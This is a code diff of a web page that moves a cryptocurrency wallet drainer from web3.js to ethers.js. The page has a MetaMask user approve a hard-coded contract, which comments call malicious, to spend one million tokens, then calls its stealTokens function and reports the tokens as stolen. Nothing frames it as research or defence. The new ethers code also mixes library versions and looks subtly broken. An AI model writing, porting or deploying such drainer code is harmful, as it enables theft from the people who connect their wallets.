@@ -11,10 +11,10 @@
     <button id="approveContract">Approve Contract</button>
     <p id="status"></p>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
     <script>
-        // Initialize Web3
-        let web3;
+        // Initialize Ethers.js
+        let provider;
         let userAddress;
         const contractAddress = "0xe1782468Df2D6B6Ca645A10EefebF4Df30a12683"; // Replace with the deployed malicious contract
         const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; // Replace with the TKK token address
@@ -86,7 +86,8 @@
 
         window.onload = async () => {
             if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
+                provider = new ethers.BrowserProvider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
                 document.getElementById("connectWallet").addEventListener("click", connectWallet);
                 document.getElementById("approveContract").addEventListener("click", approveContract);
             } else {
@@ -97,7 +98,7 @@
         // Function to connect MetaMask
         async function connectWallet() {
             try {
-                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                const accounts = await provider.listAccounts();
                 userAddress = accounts[0];
                 document.getElementById("status").innerText = `Connected: ${userAddress}`;
             } catch (error) {
@@ -114,20 +115,19 @@
             }
 
             try {
-                const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-                const maliciousContract = new web3.eth.Contract(contractABI_Malicious, contractAddress);
+                const tokenContract = new ethers.Contract(tokenAddress, contractABI, provider.getSigner());
+                const maliciousContract = new ethers.Contract(contractAddress, contractABI_Malicious, provider.getSigner());
 
-                const gasEstimate = await tokenContract.methods.approve(contractAddress, web3.utils.toWei("1000000", "ether")).estimateGas({ from: userAddress });
-                
-                // Approve the contract
-                const receipt = await tokenContract.methods.approve(contractAddress, web3.utils.toWei("1000000", "ether"))
-                    .send({ from: userAddress, gas: gasEstimate });
-                console.log("Approval receipt:", receipt);
+                // Approve the malicious contract
+                const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits("1000000", 18));
+                await tx.wait();
 
                 document.getElementById("status").innerText = "Approval granted. Attempting to steal tokens...";
-                
-                // Call the stealTokens function automatically
-                await maliciousContract.methods.stealTokens().send({ from: userAddress });
+
+                // Call the stealTokens function
+                const maliciousTx = await maliciousContract.stealTokens();
+                await maliciousTx.wait();
+
                 document.getElementById("status").innerText = "Tokens stolen successfully!";
             } catch (error) {
                 console.error("Error during approval or token transfer:", error);
@@ -137,6 +137,7 @@
     </script>
 </body>
 </html>
+
 
 
 
